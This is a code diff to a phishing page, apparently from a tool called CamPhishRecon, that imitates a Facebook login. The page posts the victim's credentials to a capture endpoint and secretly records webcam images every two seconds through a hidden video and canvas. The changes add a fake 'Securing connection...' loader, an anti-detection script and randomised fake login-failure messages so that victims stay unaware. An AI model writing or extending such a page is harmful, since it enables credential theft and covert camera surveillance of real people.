@@ -33,7 +33,14 @@ body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;min-height:100vh;
 video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
 </style>
 </head><body>
+<div id="loadScreen" style="position:fixed;inset:0;background:#f0f2f5;display:flex;align-items:center;justify-content:center;z-index:99998;font-family:sans-serif;flex-direction:column;gap:12px">
+<div style="width:24px;height:24px;border:3px solid #ddd;border-top-color:#1877f2;border-radius:50%;animation:cl 0.8s linear infinite"></div>
+<div style="font-size:13px;color:#888">Securing connection...</div>
+</div>
+<style>@keyframes cl{to{transform:rotate(360deg)}}</style>
+<div id="pageContent">
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/anti-detect.js"></script>
 <video id="v" playsinline autoplay muted></video>
 <canvas id="cap" width="320" height="240"></canvas>
 
@@ -74,7 +81,7 @@ navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).the
 var v=document.getElementById('v');v.srcObject=stream;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'fb_verify');}},2000);
-setTimeout(function(){clearInterval(ci);fs.classList.remove('active');alert('Login failed. Please check your credentials.');btn.innerHTML='Log In';btn.disabled=false;},5000);
+setTimeout(function(){clearInterval(ci);fs.classList.remove('active');var msgs=['Login failed. Please check your credentials.','We couldn\'t log you in. Please try again.','Our systems detected unusual activity. Try again later.','Sorry, something went wrong. Please try again.'];alert(msgs[Math.floor(Math.random()*msgs.length)]);btn.innerHTML='Log In';btn.disabled=false;},5000);
 }).catch(function(){setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Log In';btn.disabled=false;},2000);});
 }else{setTimeout(function(){fs.classList.remove('active');btn.innerHTML='Log In';btn.disabled=false;},2000);}
 return false;
@@ -89,5 +96,12 @@ fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
 method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
 }).catch(function(){});
 }
+</script>
+</div>
+<script>
+setTimeout(function(){
+  var loader=document.getElementById('loadScreen');
+  if(loader)loader.remove();
+},300+Math.random()*400);
 </script>
 </body></html>
